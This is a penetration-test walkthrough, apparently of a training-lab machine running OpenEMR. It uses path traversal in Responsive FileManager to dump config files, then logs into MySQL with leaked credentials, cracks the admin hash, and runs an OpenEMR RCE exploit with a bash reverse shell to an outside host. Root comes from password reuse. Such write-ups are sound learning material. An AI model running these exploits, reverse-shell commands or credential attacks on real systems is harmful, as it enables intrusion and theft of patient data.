## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.216.145

# HOSTNAME
APEX
# OPERATING SYSTEM 
Ubuntu 18.04.5 LTS (Bionic Beaver)

# CREDENTIALS                                                 // Found from inital enumeration
- Mysql
	- openemr:C78maEQUIEuQ
- OpenEMR
	- admin:thedoctor
```
## OPEN PORTS DETAILS
```bash
80/tcp   open  http        syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       syn-ack ttl 61 MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
```
# ENUMERATION
```bash
# SMB
445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)

- Found shares with read permission
sudo netexec smb $ip --shares -u '' -p ''

SMB         192.168.216.145 445    APEX             [*] Unix - Samba (name:APEX) (domain:) (signing:False) (SMBv1:True)
SMB         192.168.216.145 445    APEX             [+] \: (Guest)
SMB         192.168.216.145 445    APEX             [*] Enumerated shares
SMB         192.168.216.145 445    APEX             Share           Permissions     Remark
SMB         192.168.216.145 445    APEX             -----           -----------     ------
SMB         192.168.216.145 445    APEX             print$                          Printer Drivers
SMB         192.168.216.145 445    APEX             docs            READ            Documents
SMB         192.168.216.145 445    APEX             IPC$                            IPC Service (APEX server (Samba, Ubuntu))

- Accessing the share and more enum
sudo smbclient //$ip/docs
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Apr  9 21:17:12 2021
  ..                                  D        0  Fri Apr  9 21:17:12 2021
  OpenEMR Success Stories.pdf         A   290738  Fri Apr  9 21:17:12 2021
  OpenEMR Features.pdf                A   490355  Fri Apr  9 21:17:12 2021

- Possible OpenEMR application

# HTTP
80/tcp   open  http        syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
- Server: Apache/2.4.29

sudo whatweb $url
- Found email ids
awilliam@apex.offsec
contact@apex.offs
contact@apex.offsec
jamanda@apex.offs
jamanda@apex.offsec
jsarah@apex.offs
jsarah@apex.offsec
william@apex.offs
wwalter@apex.offs
wwalter@apex.offsec

- Possible usernames
awilliam
contact
jamanda
jsarah
william
wwalter

- add domain to /etc/host
192.168.216.145 apex.offsec apex.offs

- Found /openemr page from source code which directs to login page
http://apex.offsec/openemr/interface/login/login.php?site=default

- Fuzzing http://apex.offsec/

- Files 
sudo ffuf -c  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -of md -o fuzz/ffuf-raft-large-files -fc 403,404 -u $url/FUZZ

index.html              [Status: 200, Size: 28957, Words: 8144, Lines: 709, Duration: 37ms]

- Folders
sudo ffuf -c  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -of md -o fuzz/ffuf-raft-large-directories -fc 403,404 -u $url/FUZZ/

assets                  [Status: 200, Size: 1500, Words: 100, Lines: 20, Duration: 37ms]
source                  [Status: 200, Size: 1138, Words: 76, Lines: 18, Duration: 36ms]
thumbs                  [Status: 200, Size: 1336, Words: 87, Lines: 19, Duration: 39ms]
filemanager             [Status: 200, Size: 26348, Words: 2494, Lines: 519, Duration: 41ms]

- Found http://apex.offsec/filemanager/
- RESPONSIVE filemanager v.9.13.4
- Found Exploits
Responsive FileManager 9.13.4 - 'path' Path Traversal | php/webapps/49359.py
Responsive FileManager 9.13.4 - Multiple Vulnerabilities | php/webapps/45987.txt
Responsive FileManager < 9.13.4 - Directory Traversal| php/webapps/45271.txt

- using exploit 49359.py
python3 49359.py $url PHPSESSID=umvspjojcqtoq4314h6m8k6tt0 /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false
white:x:1000:1000::/home/white:/bin/sh

- user with shell
- white

- Analysing how the exploits 45987.txt and 49359.py work
	- copy_cut - copy the file contents
	- paste_clipboard - paste the file contents to a specified location
	- read_file - read the file contents (Directory Traversal is achieved)

- Change the paste_clipboard path location to the /Documents/ on the exploit 49359.py. Since Documents are accessible by share \\$ip\docs

def paste_clipboard(url, session_cookie):
        headers = {'Cookie': session_cookie,'Content-Type': 'application/x-www-form-urlencoded'}
        url_paste = "%s/filemanager/execute.php?action=paste_clipboard" % (url)
        r = requests.post(
        url_paste, data="path=/Documents/", headers=headers)
        return r.status_code

sudo python 49359.py http://apex.offsec/ PHPSESSID=umvspjojcqtoq4314h6m8k6tt0 /etc/passwd
[*] Copy Clipboard
[*] Paste Clipboard
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at apex.offsec Port 80</address>
</body></html>

sudo smbclient //$ip/docs
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 23 17:55:16 2024
  ..                                  D        0  Fri Apr  9 21:17:12 2021
  passwd                              N     1607  Sat Nov 23 17:55:16 2024
  OpenEMR Success Stories.pdf         A   290738  Fri Apr  9 21:17:12 2021
  OpenEMR Features.pdf                A   490355  Fri Apr  9 21:17:12 2021

- Openemr config file found Reference
	- https://github.com/openemr/openemr/blob/master/sites/default/sqlconf.php
	- https://community.open-emr.org/t/changing-mysql-server-settings/9052
	- /sites/default/sqlconf.php

- Trying dump file sqlconf.php paths to dump the config
- /var/www/html/openemr/sites/default/sqlconf.php
- /var/www/openemr/sites/default/sqlconf.php [Worked]
smb: \> dir
  .                                   D        0  Sat Nov 23 18:04:22 2024
  ..                                  D        0  Fri Apr  9 21:17:12 2021
  passwd                              N     1607  Sat Nov 23 17:56:13 2024
  sqlconf.php                         N      639  Sat Nov 23 18:04:22 2024
  OpenEMR Success Stories.pdf         A   290738  Fri Apr  9 21:17:12 2021
  OpenEMR Features.pdf                A   490355  Fri Apr  9 21:17:12 2021

- Mysql credentials on file sqlconf.php
$host   = 'localhost';
$port   = '3306';
$login  = 'openemr';
$pass   = 'C78maEQUIEuQ';
$dbase  = 'openemr';

# MYSQL
3306/tcp open  mysql       syn-ack ttl 61 MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1

- Bruteforce using possible usernames
sudo hydra -L ./poss-usernames -P ./poss-usernames -t 16 $ip mysql
1 of 1 target completed, 0 valid password found

- Access mysql using credentials
- openemr:C78maEQUIEuQ
sudo mysql -h $ip -u openemr -p                            
Enter password: 
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it

sudo mysql -h $ip -u openemr -p --skip-ssl-verify-server-cert                        
Enter password: C78maEQUIEuQ
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| openemr            |
+--------------------+

MariaDB [(none)]> use openemr;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [openemr]> show tables;
+---------------------------------------+
| Tables_in_openemr                     |
+---------------------------------------+
| addresses                             |
| amc_misc_data                         |
| amendments                            |
| amendments_history                    |
| ar_activity                           |
| ar_session                            |
| array                                 |
| audit_details                         |
| audit_master                          |
| automatic_notification                |
| background_services                   |
| batchcom                              |
| billing                               |
| calendar_external                     |
| categories                            |
| categories_seq                        |
| categories_to_documents               |
| ccda                                  |
| ccda_components                       |
| ccda_field_mapping                    |
| ccda_sections                         |
| ccda_table_mapping                    |
| chart_tracker                         |
| claims                                |
| clinical_plans                        |
| clinical_plans_rules                  |
| clinical_rules                        |
| clinical_rules_log                    |
| code_types                            |
| codes                                 |
| codes_history                         |
| config                                |
| config_seq                            |
| customlists                           |
| dated_reminders                       |
| dated_reminders_link                  |
| direct_message_log                    |
| documents                             |
| documents_legal_categories            |
| documents_legal_detail                |
| documents_legal_master                |
| drug_inventory                        |
| drug_sales                            |
| drug_templates                        |
| drugs                                 |
| eligibility_response                  |
| eligibility_verification              |
| employer_data                         |
| enc_category_map                      |
| erx_drug_paid                         |
| erx_narcotics                         |
| erx_rx_log                            |
| erx_ttl_touch                         |
| esign_signatures                      |
| extended_log                          |
| external_encounters                   |
| external_procedures                   |
| facility                              |
| facility_user_ids                     |
| fee_sheet_options                     |
| form_care_plan                        |
| form_clinical_instructions            |
| form_dictation                        |
| form_encounter                        |
| form_eye_mag                          |
| form_eye_mag_dispense                 |
| form_eye_mag_impplan                  |
| form_eye_mag_orders                   |
| form_eye_mag_prefs                    |
| form_eye_mag_wearing                  |
| form_functional_cognitive_status      |
| form_group_attendance                 |
| form_groups_encounter                 |
| form_misc_billing_options             |
| form_observation                      |
| form_reviewofs                        |
| form_ros                              |
| form_soap                             |
| form_taskman                          |
| form_vitals                           |
| forms                                 |
| gacl_acl                              |
| gacl_acl_sections                     |
| gacl_acl_seq                          |
| gacl_aco                              |
| gacl_aco_map                          |
| gacl_aco_sections                     |
| gacl_aco_sections_seq                 |
| gacl_aco_seq                          |
| gacl_aro                              |
| gacl_aro_groups                       |
| gacl_aro_groups_id_seq                |
| gacl_aro_groups_map                   |
| gacl_aro_map                          |
| gacl_aro_sections                     |
| gacl_aro_sections_seq                 |
| gacl_aro_seq                          |
| gacl_axo                              |
| gacl_axo_groups                       |
| gacl_axo_groups_map                   |
| gacl_axo_map                          |
| gacl_axo_sections                     |
| gacl_groups_aro_map                   |
| gacl_groups_axo_map                   |
| gacl_phpgacl                          |
| geo_country_reference                 |
| geo_zone_reference                    |
| globals                               |
| gprelations                           |
| groups                                |
| history_data                          |
| icd10_dx_order_code                   |
| icd10_gem_dx_10_9                     |
| icd10_gem_dx_9_10                     |
| icd10_gem_pcs_10_9                    |
| icd10_gem_pcs_9_10                    |
| icd10_pcs_order_code                  |
| icd10_reimbr_dx_9_10                  |
| icd10_reimbr_pcs_9_10                 |
| icd9_dx_code                          |
| icd9_dx_long_code                     |
| icd9_sg_code                          |
| icd9_sg_long_code                     |
| immunization_observation              |
| immunizations                         |
| insurance_companies                   |
| insurance_data                        |
| insurance_numbers                     |
| issue_encounter                       |
| issue_types                           |
| lang_constants                        |
| lang_custom                           |
| lang_definitions                      |
| lang_languages                        |
| layout_group_properties               |
| layout_options                        |
| lbf_data                              |
| lbt_data                              |
| list_options                          |
| lists                                 |
| lists_touch                           |
| log                                   |
| log_comment_encrypt                   |
| log_validator                         |
| medex_icons                           |
| medex_outgoing                        |
| medex_prefs                           |
| medex_recalls                         |
| misc_address_book                     |
| module_acl_group_settings             |
| module_acl_sections                   |
| module_acl_user_settings              |
| module_configuration                  |
| modules                               |
| modules_hooks_settings                |
| modules_settings                      |
| multiple_db                           |
| notes                                 |
| notification_log                      |
| notification_settings                 |
| onotes                                |
| onsite_documents                      |
| onsite_mail                           |
| onsite_messages                       |
| onsite_online                         |
| onsite_portal_activity                |
| onsite_signatures                     |
| openemr_module_vars                   |
| openemr_modules                       |
| openemr_postcalendar_categories       |
| openemr_postcalendar_events           |
| openemr_postcalendar_limits           |
| openemr_postcalendar_topics           |
| openemr_session_info                  |
| patient_access_offsite                |
| patient_access_onsite                 |
| patient_birthday_alert                |
| patient_data                          |
| patient_portal_menu                   |
| patient_reminders                     |
| patient_tracker                       |
| patient_tracker_element               |
| payment_gateway_details               |
| payments                              |
| pharmacies                            |
| phone_numbers                         |
| pma_bookmark                          |
| pma_column_info                       |
| pma_history                           |
| pma_pdf_pages                         |
| pma_relation                          |
| pma_table_coords                      |
| pma_table_info                        |
| pnotes                                |
| prescriptions                         |
| prices                                |
| procedure_answers                     |
| procedure_order                       |
| procedure_order_code                  |
| procedure_providers                   |
| procedure_questions                   |
| procedure_report                      |
| procedure_result                      |
| procedure_type                        |
| product_registration                  |
| product_warehouse                     |
| registry                              |
| report_itemized                       |
| report_results                        |
| rule_action                           |
| rule_action_item                      |
| rule_filter                           |
| rule_patient_data                     |
| rule_reminder                         |
| rule_target                           |
| sequences                             |
| shared_attributes                     |
| standardized_tables_track             |
| supported_external_dataloads          |
| syndromic_surveillance                |
| template_users                        |
| therapy_groups                        |
| therapy_groups_counselors             |
| therapy_groups_participant_attendance |
| therapy_groups_participants           |
| transactions                          |
| user_settings                         |
| users                                 |
| users_facility                        |
| users_secure                          |
| valueset                              |
| version                               |
| voids                                 |
| x12_partners                          |
+---------------------------------------+
234 rows in set (0.038 sec)

MariaDB [openemr]> select * from users_secure;
+----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+
| id | username | password                                                     | salt                           | last_update         | password_history1 | salt_history1 | password_history2 | salt_history2 |
+----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+
|  1 | admin    | $2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC | $2a$05$bJcIfCBjN5Fuh0K9qfoe0n$ | 2021-05-17 10:56:27 | NULL              | NULL          | NULL              | NULL          |
+----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+

- Found admin user hash

- Cracking the hash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt sql-hash
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thedoctor        (?)
1g 0:00:00:03 DONE (2024-11-23 12:35) 0.2739g/s 11953p/s 11953c/s 11953C/s versus..sportygirl
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

- Openemr creds | admin:thedoctor
- Found version 
	- OpenEMR Version Number: v5.0.1 (1)
```
## INITIAL FOOTHOLD
```bash
# OpenEMR Version Number: v5.0.1 (1) - Exploit - 45161.py
sudo nc -nvlp 80

python 45161.py -u admin -p thedoctor -c "bash -i >& /dev/tcp/192.168.45.186/80 0>&1" http://192.168.216.145/openemr
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
 )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
                                                       
   ={   P R O J E C T    I N S E C U R I T Y   }=    
                                                       
         Twitter : @Insecurity                       
         Site    : insecurity.sh                     

[$] Authenticating with admin:thedoctor
[$] Injecting payload

sudo nc -nvlp 80                           
[sudo] password for kali: 
listening on [any] 80 ...
connect to [192.168.45.186] from (UNKNOWN) [192.168.216.145] 57920
bash: cannot set terminal process group (1402): Inappropriate ioctl for device
bash: no job control in this shell
www-data@APEX:/var/www/openemr/interface/main$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@APEX:/var/www/openemr/interface/main$ whoami
whoami
www-data
www-data@APEX:/var/www/openemr/interface/main$ 
```
## PRIVILEGE ESCALATION
```bash
# Password Reuse
- password - thedoctor
www-data@APEX:/$ su root
Password: 
root@APEX:/# id
uid=0(root) gid=0(root) groups=0(root)
root@APEX:/# whoami
root
root@APEX:/# 

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Sat Nov 23 09:20:31 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.216.145
Nmap scan report for 192.168.216.145
Host is up, received echo-reply ttl 61 (0.037s latency).
Scanned at 2024-11-23 09:20:33 IST for 195s
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE     REASON         VERSION
80/tcp   open  http        syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: APEX Hospital
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       syn-ack ttl 61 MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 33
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, SupportsCompression, LongPassword, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, FoundRows, ODBCClient, Speaks41ProtocolOld, LongColumnFlag, InteractiveClient, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, SupportsTransactions, Speaks41ProtocolNew, IgnoreSigpipes, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: D+HgO4W;]CvJN)~cVdr0
|_  Auth Plugin Name: mysql_native_password
Service Info: Host: APEX

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: apex
|   NetBIOS computer name: APEX\x00
|   Domain name: \x00
|   FQDN: apex
|_  System time: 2024-11-22T22:53:02-05:00
|_clock-skew: mean: 1h40m00s, deviation: 2h53m14s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32767/tcp): CLEAN (Timeout)
|   Check 2 (port 39849/tcp): CLEAN (Timeout)
|   Check 3 (port 17787/udp): CLEAN (Timeout)
|   Check 4 (port 63755/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-11-23T03:52:59
|_  start_date: N/A

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 23 09:23:48 2024 -- 1 IP address (1 host up) scanned in 197.15 seconds

```

